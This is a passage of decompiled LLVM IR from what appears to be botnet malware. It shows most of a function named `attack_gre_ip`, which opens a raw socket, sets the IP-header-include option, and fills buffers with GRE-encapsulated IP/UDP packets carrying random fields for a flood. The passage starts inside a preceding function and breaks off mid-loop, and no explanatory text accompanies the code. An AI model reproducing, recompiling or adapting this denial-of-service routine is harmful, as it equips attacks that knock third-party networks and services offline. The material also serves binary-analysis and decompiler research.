  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 7, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 22, 23, 24, 26, 25, 30, 27, 28, 29, 33, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 13, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 6, 5, 4, 1, 0, 3, 2, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_ad18, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ab28, { 1, 0 }
  uselistorder label %dec_label_pc_aac4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa50, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_ad34 = load i32, i32* @r4, align 4
  %v24_ad34 = load i32, i32* @fp, align 4
  %v27_ad34 = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_ad60 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ad64 = load i32, i32* @r4, align 4
  store i32 %v0_ad64, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ad70 = load i32, i32* @sb, align 4
  store i32 %v0_ad70, i32* %r3.global-to-local, align 4
  %v0_ad74 = load i32, i32* @r5, align 4
  %v5_ad78 = inttoptr i32 %v0_ad64 to i32*
  %v6_ad78 = call i32 @attack_get_opt_int(i32 %v0_ad74, i32* %v5_ad78, i32 2, i32 %v0_ad70)
  %v1_ad84 = urem i32 %v6_ad78, 256
  store i32 %v1_ad84, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ad90 = load i32, i32* @r4, align 4
  store i32 %v0_ad90, i32* %r1.global-to-local, align 4
  %v0_ad94 = load i32, i32* @r5, align 4
  %v5_ad98 = trunc i32 %v6_ad78 to i8
  %v7_ad9c = inttoptr i32 %v0_ad90 to i32*
  %v8_ad9c = call i32 @attack_get_opt_int(i32 %v0_ad94, i32* %v7_ad9c, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_ada0 = load i32, i32* @r4, align 4
  store i32 %v0_ada0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_adb0 = load i32, i32* @r5, align 4
  %v5_adb4 = inttoptr i32 %v0_ada0 to i32*
  %v6_adb4 = call i32 @attack_get_opt_int(i32 %v0_adb0, i32* %v5_adb4, i32 4, i32 64)
  %v1_adbc = urem i32 %v6_adb4, 256
  store i32 %v1_adbc, i32* %ip.global-to-local, align 4
  %v0_adc0 = load i32, i32* @r4, align 4
  store i32 %v0_adc0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_adcc = load i32, i32* @r5, align 4
  %v6_add4 = inttoptr i32 %v0_adc0 to i32*
  %v7_add4 = call i32 @attack_get_opt_int(i32 %v0_adcc, i32* %v6_add4, i32 5, i32 1)
  %v1_ade0 = urem i32 %v7_add4, 256
  store i32 %v1_ade0, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_adec = load i32, i32* @r4, align 4
  store i32 %v0_adec, i32* %r1.global-to-local, align 4
  %v0_adf0 = load i32, i32* @r5, align 4
  %v6_adf8 = inttoptr i32 %v0_adec to i32*
  %v7_adf8 = call i32 @attack_get_opt_int(i32 %v0_adf0, i32* %v6_adf8, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_ae00 = load i32, i32* @r4, align 4
  store i32 %v0_ae00, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_adf8, i32* %fp.global-to-local, align 4
  %v0_ae10 = load i32, i32* @r5, align 4
  %v5_ae14 = inttoptr i32 %v0_ae00 to i32*
  %v6_ae14 = call i32 @attack_get_opt_int(i32 %v0_ae10, i32* %v5_ae14, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_ae18 = load i32, i32* @r4, align 4
  store i32 %v0_ae18, i32* %r1.global-to-local, align 4
  %v0_ae1c = load i32, i32* @sb, align 4
  store i32 %v0_ae1c, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_ae14, i32* @r8, align 4
  %v0_ae28 = load i32, i32* @r5, align 4
  %v4_ae2c = inttoptr i32 %v0_ae18 to i32*
  %v5_ae2c = call i32 @attack_get_opt_int(i32 %v0_ae28, i32* %v4_ae2c, i32 %v0_ae1c, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ae3c = load i32, i32* @r4, align 4
  store i32 %v0_ae3c, i32* %r1.global-to-local, align 4
  %v0_ae40 = load i32, i32* @r5, align 4
  %v4_ae44 = inttoptr i32 %v0_ae3c to i32*
  %v5_ae44 = call i32 @attack_get_opt_int(i32 %v0_ae40, i32* %v4_ae44, i32 1, i32 1)
  %v1_ae4c = urem i32 %v5_ae44, 256
  store i32 %v1_ae4c, i32* %ip.global-to-local, align 4
  %v0_ae50 = load i32, i32* @r4, align 4
  store i32 %v0_ae50, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_ae58 = load i32, i32* @sb, align 4
  store i32 %v0_ae58, i32* %r3.global-to-local, align 4
  %v0_ae5c = load i32, i32* @r5, align 4
  %v5_ae64 = inttoptr i32 %v0_ae50 to i32*
  %v6_ae64 = call i32 @attack_get_opt_int(i32 %v0_ae5c, i32* %v5_ae64, i32 18, i32 %v0_ae58)
  %v0_ae6c = load i32, i32* @r4, align 4
  store i32 %v0_ae6c, i32* %r1.global-to-local, align 4
  %v2_ae70 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_ae70, i32* %r3.global-to-local, align 4
  store i32 %v6_ae64, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_ae7c = load i32, i32* @r5, align 4
  %v4_ae80 = inttoptr i32 %v0_ae6c to i32*
  %v5_ae80 = call i32 @attack_get_opt_int(i32 %v0_ae7c, i32* %v4_ae80, i32 24, i32 %v2_ae70)
  %v0_ae88 = load i32, i32* @sb, align 4
  %v1_ae8c = inttoptr i32 %v0_ae88 to i32*
  %v2_ae8c = call i32 @__GI_time(i32* %v1_ae8c)
  %v1_ae90 = load i32, i32* @r6, align 4
  %v2_ae90 = add i32 %v1_ae90, %v2_ae8c
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_aea4 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_aea8 = icmp eq i32 %v3_aea4, -1
  store i1 %v7_aea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aea8, label %dec_label_pc_b378, label %dec_label_pc_aeb4

dec_label_pc_aeb4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_aebc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_aebc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_aec4 = load i32, i32* @sb, align 4
  store i32 %v0_aec4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_aed0 = call i32 @__GI_setsockopt(i32 %v3_aea4, i32 %v0_aec4, i32 3, i32 %v6_aebc, i32 4)
  %v7_aed4 = icmp eq i32 %v5_aed0, -1
  store i1 %v7_aed4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aed4, label %dec_label_pc_b384, label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aeb4
  %v0_aedc = load i32, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_aef0 = load i32, i32* @r8, align 4
  %v3_aef4 = mul i32 %v8_ad9c, 65536
  store i32 %v3_aef4, i32* %r1.global-to-local, align 4
  %v0_aef8 = load i32, i32* @r7, align 4
  %v1_aef8 = urem i32 %v0_aef8, 256
  store i32 %v1_aef8, i32* @r7, align 4
  %v3_aefc = urem i32 %v0_aedc, 65536
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v3_af00 = urem i32 %v0_aef0, 65536
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v2_af04 = icmp eq i32 %arg2, 0
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  %v0_af14 = load i32, i32* @sb, align 4
  store i32 %v0_af14, i32* %stack_var_-44, align 4
  %v3_af18 = urem i32 %v8_ad9c, 65536
  store i32 %v3_af18, i32* @fp, align 4
  br i1 %v2_af04, label %dec_label_pc_b10c.preheader, label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_aedc
  %v3_aef0 = mul i32 %v0_aef0, 65536
  %v3_aedc = mul i32 %v0_aedc, 65536
  %v3_af2c = mul i32 %v5_ae2c, 65536
  %v1_af30 = add i32 %v3_af2c, 3407872
  %tmp68 = udiv i32 %v1_af30, 256
  %v3_af3c = and i32 %tmp68, 65280
  %v8_ad9c.not = or i32 %v8_ad9c, -65536
  %v1_af40 = xor i32 %v8_ad9c.not, 65535
  %v4_af44 = udiv i32 %v1_af30, 16777216
  %v5_af44 = or i32 %v3_af3c, %v4_af44
  store i32 %v3_aef4, i32* %r3.global-to-local, align 4
  %tmp69 = mul i32 %v8_ad9c, 256
  %v3_af5c = and i32 %tmp69, 65280
  %tmp70 = mul nsw i32 %v1_af40, 256
  %v3_af60 = and i32 %tmp70, 65280
  %tmp71 = udiv i32 %v8_ad9c, 256
  %v4_af64 = urem i32 %tmp71, 256
  %v5_af64 = or i32 %v4_af64, %v3_af5c
  %tmp72 = udiv i32 %v1_af40, 256
  %v4_af6c = urem i32 %tmp72, 256
  %v5_af6c = or i32 %v4_af6c, %v3_af60
  store i32 %v5_af6c, i32* @r6, align 4
  store i32 %v3_aedc, i32* %r1.global-to-local, align 4
  store i32 %v3_aef0, i32* %r2.global-to-local, align 4
  %v1_af80 = add i32 %v3_af2c, 524288
  %tmp73 = mul i32 %v0_aedc, 256
  %v3_af84 = and i32 %tmp73, 65280
  %v1_af88 = add i32 %v3_af2c, 1835008
  store i32 %v1_af88, i32* @r5, align 4
  %tmp74 = mul i32 %v0_aef0, 256
  %v3_af8c = and i32 %tmp74, 65280
  %v3_af94 = udiv i32 %v1_af88, 256
  %tmp75 = udiv i32 %v0_aedc, 256
  %v4_af98 = urem i32 %tmp75, 256
  %v5_af98 = or i32 %v4_af98, %v3_af84
  %tmp76 = udiv i32 %v0_aef0, 256
  %v4_af9c = urem i32 %tmp76, 256
  %v5_af9c = or i32 %v4_af9c, %v3_af8c
  store i32 %v5_af9c, i32* %ip.global-to-local, align 4
  %v1_afa0 = and i32 %v3_af94, 65280
  %tmp77 = udiv i32 %v1_af80, 256
  %v3_afa4 = and i32 %tmp77, 65280
  store i32 %v3_afa4, i32* @lr, align 4
  %v4_afb8 = udiv i32 %v1_af80, 16777216
  %v5_afb8 = or i32 %v3_afa4, %v4_afb8
  store i32 %v5_afb8, i32* @r7, align 4
  %v4_afbc = udiv i32 %v1_af88, 16777216
  %v5_afbc = or i32 %v1_afa0, %v4_afbc
  store i32 %v5_afbc, i32* @r8, align 4
  store i32 %v0_af14, i32* @r4, align 4
  %v4_b014 = sext i8 %v5_ad98 to i32
  %v1_b020 = trunc i32 %v6_adb4 to i8
  %sext = mul nuw i32 %v5_af44, 65536
  %v4_b028 = sdiv i32 %sext, 65536
  %sext8 = mul nuw i32 %v5_af64, 65536
  %v4_b02c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_af6c, 65536
  %v4_b094 = sdiv i32 %sext9, 65536
  %v2_b0c4 = icmp eq i32 %v1_aef8, 0
  %sext10 = mul nuw i32 %v5_af98, 65536
  %v4_b0e8 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_af9c, 65536
  %v4_b0f0 = sdiv i32 %sext11, 65536
  %extract.t = trunc i32 %v4_b028 to i16
  br label %dec_label_pc_afc4

dec_label_pc_afc4:                                ; preds = %bb82, %dec_label_pc_af28
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_afd0 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_ad60, i32* %ip.global-to-local, align 4
  %v2_afdc = load i32, i32* @r4, align 4
  %v5_afdc = mul i32 %v2_afdc, 4
  %v6_afdc = add i32 %v5_afdc, %v2_ad60
  %v7_afdc = inttoptr i32 %v6_afdc to i32*
  store i32 %v2_afd0, i32* %v7_afdc, align 4
  %v3_afe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_afe0, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* %ip.global-to-local, align 4
  %v4_afe4 = mul i32 %v3_afe0, 4
  %v5_afe4 = add i32 %v0_afe4, %v4_afe4
  %v6_afe4 = inttoptr i32 %v5_afe4 to i32*
  %v7_afe4 = load i32, i32* %v6_afe4, align 4
  store i32 %v7_afe4, i32* %r4.global-to-local, align 4
  %v1_afe8 = inttoptr i32 %v7_afe4 to i8*
  %v2_afe8 = load i8, i8* %v1_afe8, align 1
  %tmp = urem i8 %v2_afe8, 16
  %v1_afec = zext i8 %tmp to i32
  %v1_aff0 = or i32 %v1_afec, 64
  store i32 %v1_aff0, i32* %r2.global-to-local, align 4
  %v1_aff4 = trunc i32 %v1_aff0 to i8
  store i8 %v1_aff4, i8* %v1_afe8, align 1
  %v0_aff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_affc = mul i32 %v0_aff8, 24
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v0_b000 = load i32, i32* %r4.global-to-local, align 4
  %v1_b000 = inttoptr i32 %v0_b000 to i8*
  %v2_b000 = load i8, i8* %v1_b000, align 1
  %v1_b004 = and i8 %v2_b000, -16
  %v1_b008 = or i8 %v1_b004, 5
  store i32 %v1_ade0, i32* %lr.global-to-local, align 4
  store i8 %v1_b008, i8* %v1_b000, align 1
  store i32 %v4_b014, i32* %r2.global-to-local, align 4
  %v2_b018 = load i32, i32* %r4.global-to-local, align 4
  %v3_b018 = add i32 %v2_b018, 1
  %v4_b018 = inttoptr i32 %v3_b018 to i8*
  store i8 %v5_ad98, i8* %v4_b018, align 1
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v2_b020 = load i32, i32* %r4.global-to-local, align 4
  %v3_b020 = add i32 %v2_b020, 8
  %v4_b020 = inttoptr i32 %v3_b020 to i8*
  store i8 %v1_b020, i8* %v4_b020, align 1
  %v0_b024 = load i32, i32* %lr.global-to-local, align 4
  %v2_b024 = icmp eq i32 %v0_b024, 0
  store i1 %v2_b024, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b028, i32* %ip.global-to-local, align 4
  store i32 %v4_b02c, i32* %lr.global-to-local, align 4
  br i1 %v2_b024, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_afc4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b034 = load i32, i32* %r4.global-to-local, align 4
  %v4_b034 = add i32 %v3_b034, 6
  %v5_b034 = inttoptr i32 %v4_b034 to i16*
  store i16 64, i16* %v5_b034, align 2
  %v0_b038.pre = load i32, i32* %ip.global-to-local, align 4
  %extract.t27 = trunc i32 %v0_b038.pre to i16
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_afc4, %bb
  %v0_b038.off0 = phi i16 [ %extract.t, %dec_label_pc_afc4 ], [ %extract.t27, %bb ]
  %v2_b038 = load i32, i32* %r4.global-to-local, align 4
  %v3_b038 = add i32 %v2_b038, 2
  %v4_b038 = inttoptr i32 %v3_b038 to i16*
  store i16 %v0_b038.off0, i16* %v4_b038, align 2
  %v0_b03c = load i32, i32* %r4.global-to-local, align 4
  %v1_b03c = add i32 %v0_b03c, 20
  store i32 %v1_b03c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v3_b048 = add i32 %v0_b03c, 9
  %v4_b048 = inttoptr i32 %v3_b048 to i8*
  store i8 47, i8* %v4_b048, align 1
  %v0_b04c = load i32, i32* %lr.global-to-local, align 4
  %v1_b04c = trunc i32 %v0_b04c to i16
  %v2_b04c = load i32, i32* %r4.global-to-local, align 4
  %v3_b04c = add i32 %v2_b04c, 4
  %v4_b04c = inttoptr i32 %v3_b04c to i16*
  store i16 %v1_b04c, i16* %v4_b04c, align 2
  %v0_b050 = load i32, i32* %ip.global-to-local, align 4
  %v1_b050 = trunc i32 %v0_b050 to i16
  %v2_b050 = load i32, i32* %r2.global-to-local, align 4
  %v3_b050 = add i32 %v2_b050, 2
  %v4_b050 = inttoptr i32 %v3_b050 to i16*
  store i16 %v1_b050, i16* %v4_b050, align 2
  store i32 %v5_ae80, i32* %lr.global-to-local, align 4
  %v0_b058 = load i32, i32* %r4.global-to-local, align 4
  %v1_b058 = add i32 %v0_b058, 24
  %v2_b058 = inttoptr i32 %v1_b058 to i8*
  %v3_b058 = load i8, i8* %v2_b058, align 1
  %v4_b058 = zext i8 %v3_b058 to i32
  store i32 %v4_b058, i32* %r2.global-to-local, align 4
  %v2_b05c = add i32 %v0_b058, 12
  %v3_b05c = inttoptr i32 %v2_b05c to i32*
  store i32 %v5_ae80, i32* %v3_b05c, align 4
  %v0_b060 = load i32, i32* %r2.global-to-local, align 4
  %v1_b060 = and i32 %v0_b060, -241
  %v1_b064 = or i32 %v1_b060, 64
  store i32 %v1_b064, i32* %r2.global-to-local, align 4
  %v0_b068 = load i32, i32* %r1.global-to-local, align 4
  %v1_b068 = load i32, i32* @sl, align 4
  %v2_b068 = add i32 %v1_b068, %v0_b068
  store i32 %v2_b068, i32* %r1.global-to-local, align 4
  %v1_b06c = add i32 %v2_b068, 16
  %v2_b06c = inttoptr i32 %v1_b06c to i32*
  %v3_b06c = load i32, i32* %v2_b06c, align 4
  store i32 %v3_b06c, i32* %r1.global-to-local, align 4
  %v1_b070 = trunc i32 %v1_b064 to i8
  %v2_b070 = load i32, i32* %r4.global-to-local, align 4
  %v3_b070 = add i32 %v2_b070, 24
  %v4_b070 = inttoptr i32 %v3_b070 to i8*
  store i8 %v1_b070, i8* %v4_b070, align 1
  %v0_b074 = load i32, i32* %r4.global-to-local, align 4
  %v1_b074 = add i32 %v0_b074, 24
  %v2_b074 = inttoptr i32 %v1_b074 to i8*
  %v3_b074 = load i8, i8* %v2_b074, align 1
  %v1_b078 = and i8 %v3_b074, -16
  %v1_b07c = or i8 %v1_b078, 5
  store i8 %v1_b07c, i8* %v2_b074, align 1
  %v0_b084 = load i32, i32* %r1.global-to-local, align 4
  %v1_b084 = load i32, i32* %r4.global-to-local, align 4
  %v2_b084 = add i32 %v1_b084, 16
  %v3_b084 = inttoptr i32 %v2_b084 to i32*
  store i32 %v0_b084, i32* %v3_b084, align 4
  store i32 %v4_b014, i32* %r1.global-to-local, align 4
  %v0_b08c = load i32, i32* %r4.global-to-local, align 4
  %v1_b08c = add i32 %v0_b08c, 24
  store i32 %v1_b08c, i32* @r5, align 4
  %v3_b090 = add i32 %v0_b08c, 25
  %v4_b090 = inttoptr i32 %v3_b090 to i8*
  store i8 %v5_ad98, i8* %v4_b090, align 1
  store i32 %v4_b094, i32* %r2.global-to-local, align 4
  %v0_b098 = load i32, i32* @r8, align 4
  %v1_b098 = trunc i32 %v0_b098 to i16
  %v2_b098 = load i32, i32* @r5, align 4
  %v3_b098 = add i32 %v2_b098, 2
  %v4_b098 = inttoptr i32 %v3_b098 to i16*
  store i16 %v1_b098, i16* %v4_b098, align 2
  %v0_b09c = load i32, i32* %r2.global-to-local, align 4
  %v1_b09c = trunc i32 %v0_b09c to i16
  %v2_b09c = load i32, i32* @r5, align 4
  %v3_b09c = add i32 %v2_b09c, 4
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0a4, label %bb79, label %bb78

bb78:                                             ; preds = %.thread
  store i32 64, i32* %ip.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %.thread, %bb78
  %v2_b0a8 = load i32, i32* @r5, align 4
  %v3_b0a8 = add i32 %v2_b0a8, 8
  %v4_b0a8 = inttoptr i32 %v3_b0a8 to i8*
  store i8 %v1_b020, i8* %v4_b0a8, align 1
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b0b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b0b0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_b0b0 = load i32, i32* %ip.global-to-local, align 4
  %v2_b0b0 = trunc i32 %v1_b0b0 to i16
  %v3_b0b0 = load i32, i32* @r5, align 4
  %v4_b0b0 = add i32 %v3_b0b0, 6
  %v5_b0b0 = inttoptr i32 %v4_b0b0 to i16*
  store i16 %v2_b0b0, i16* %v5_b0b0, align 2
  %v0_b0b4.pre = load i32, i32* %r3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_b0b4.pre to i8
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_b0b4.off0 = phi i8 [ 17, %bb79 ], [ %extract.t28, %bb80 ]
  %v2_b0b4 = load i32, i32* @r5, align 4
  %v3_b0b4 = add i32 %v2_b0b4, 9
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i8*
  store i8 %v0_b0b4.off0, i8* %v4_b0b4, align 1
  %v0_b0b8 = call i32 @rand_next()
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b0c4, i1* %cpsr_z.global-to-local, align 1
  %v1_b0c8 = sub i32 1023, %v0_b0b8
  store i32 %v1_b0c8, i32* %r3.global-to-local, align 4
  br i1 %v2_b0c4, label %.thread12, label %.thread13

.thread12:                                        ; preds = %bb81
  %v2_b0d0 = load i32, i32* @r5, align 4
  %v3_b0d0 = add i32 %v2_b0d0, 16
  %v4_b0d0 = inttoptr i32 %v3_b0d0 to i32*
  store i32 %v1_b0c8, i32* %v4_b0d0, align 4
  br label %bb82

.thread13:                                        ; preds = %bb81
  %v1_b0cc = load i32, i32* %r4.global-to-local, align 4
  %v2_b0cc = add i32 %v1_b0cc, 16
  %v3_b0cc = inttoptr i32 %v2_b0cc to i32*
  %v4_b0cc = load i32, i32* %v3_b0cc, align 4
  store i32 %v4_b0cc, i32* %r3.global-to-local, align 4
  %v2_b0d4 = load i32, i32* @r5, align 4
  %v3_b0d4 = add i32 %v2_b0d4, 16
  %v4_b0d4 = inttoptr i32 %v3_b0d4 to i32*
  store i32 %v4_b0cc, i32* %v4_b0d4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread12, %.thread13
  %v1_b0d8 = load i32, i32* @r5, align 4
  %v2_b0d8 = add i32 %v1_b0d8, 12
  %v3_b0d8 = inttoptr i32 %v2_b0d8 to i32*
  store i32 %v0_b0b8, i32* %v3_b0d8, align 4
  %v3_b0dc = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_b0e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b0e4 = add i32 %v0_b0e4, 44
  store i32 %v1_b0e4, i32* @r6, align 4
  store i32 %v4_b0e8, i32* %r2.global-to-local, align 4
  %v1_b0ec = add i32 %v3_b0dc, 1
  store i32 %v1_b0ec, i32* @r4, align 4
  store i32 %v4_b0f0, i32* %r3.global-to-local, align 4
  %v9_b0f4 = icmp eq i32 %v1_b0ec, %arg2
  store i1 %v9_b0f4, i1* %cpsr_z.global-to-local, align 1
  %v0_b0f8 = load i32, i32* @r7, align 4
  %v1_b0f8 = trunc i32 %v0_b0f8 to i16
  %v3_b0f8 = add i32 %v0_b0e4, 48
  %v4_b0f8 = inttoptr i32 %v3_b0f8 to i16*
  store i16 %v1_b0f8, i16* %v4_b0f8, align 2
  %v0_b0fc = load i32, i32* %r2.global-to-local, align 4
  %v1_b0fc = trunc i32 %v0_b0fc to i16
  %v2_b0fc = load i32, i32* @r6, align 4
  %v3_b0fc = inttoptr i32 %v2_b0fc to i16*
  store i16 %v1_b0fc, i16* %v3_b0fc, align 2
  %v0_b100 = load i32, i32* %r3.global-to-local, align 4
  %v1_b100 = trunc i32 %v0_b100 to i16
  %v2_b100 = load i32, i32* @r6, align 4
  %v3_b100 = add i32 %v2_b100, 2
  %v4_b100 = inttoptr i32 %v3_b100 to i16*
  store i16 %v1_b100, i16* %v4_b100, align 2
  %v0_b104 = load i32, i32* @r4, align 4
  store i32 %v0_b104, i32* %stack_var_-44, align 4
  %v5_b108 = icmp slt i32 %v1_b0ec, %arg2
  br i1 %v5_b108, label %dec_label_pc_afc4, label %dec_label_pc_b10c.preheader

dec_label_pc_b10c.preheader:                      ; preds = %bb82, %dec_label_pc_aedc
  %v1_b128 = add i32 %v5_ae2c, 8
  %v1_b12c = add i32 %v5_ae2c, 52
  %v2_b138 = icmp eq i32 %v5_ae80, -1
  %v7_b138 = icmp eq i32 %v5_ae80, -1
  %v2_b31c = icmp eq i32 %v1_aef8, 0
  %v2_b338 = icmp eq i32 %v1_ae4c, 0
  br label %dec_label_pc_b10c

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b10c.preheader, %dec_label_pc_b364
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_af04, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_af04, label %dec_label_pc_b364, label %dec_label_pc_b120

dec_label_pc_b120:                                ; preds = %dec_label_pc_b10c
  store i32 %v5_ae2c, i32* %lr.global-to-local, align 4
  store i32 %v1_b128, i32* @sb, align 4
  store i32 %v1_b12c, i32* @r8, align 4
  br label %dec_label_pc_b238

dec_label_pc_b134:                                ; preds = %dec_label_pc_b238
  store i32 %v5_ae80, i32* %r2.global-to-local, align 4
  store i1 %v7_b138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b138, label %dec_label_pc_b2c0, label %dec_label_pc_b140

dec_label_pc_b140:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b134
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  %v0_b148 = load i32, i32* @fp, align 4
  %v9_b148 = icmp eq i32 %v0_b148, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  store i1 %v9_b148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b148, label %dec_label_pc_b2d8, label %dec_label_pc_b150

dec_label_pc_b150:                                ; preds = %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge, %dec_label_pc_b140
  %v1_b154 = phi i32 [ %v1_b154.pre, %dec_label_pc_b2c0.dec_label_pc_b150_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_b140 ]
  store i32 %v3_aefc, i32* %r3.global-to-local, align 4
  %v9_b154 = icmp eq i32 %v3_aefc, %v1_b154
  store i1 %v9_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b154, label %dec_label_pc_b300, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b2d8, %dec_label_pc_b150
  %v1_b160 = phi i32 [ %v1_b2f8, %dec_label_pc_b2d8 ], [ %v1_b154, %dec_label_pc_b150 ]
  store i32 %v3_af00, i32* %ip.global-to-local, align 4
  %v9_b160 = icmp eq i32 %v3_af00, %v1_b160
  store i1 %v9_b160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b160, label %dec_label_pc_b314, label %dec_label_pc_b168

dec_label_pc_b168:                                ; preds = %dec_label_pc_b300, %dec_label_pc_b15c
  store i32 %v1_aef8, i32* @lr, align 4
  store i1 %v2_b31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b31c, label %dec_label_pc_b330, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_b168
  %v1_b170 = load i32, i32* @r5, align 4
  %v2_b170 = add i32 %v1_b170, 16
  %v3_b170 = inttoptr i32 %v2_b170 to i32*
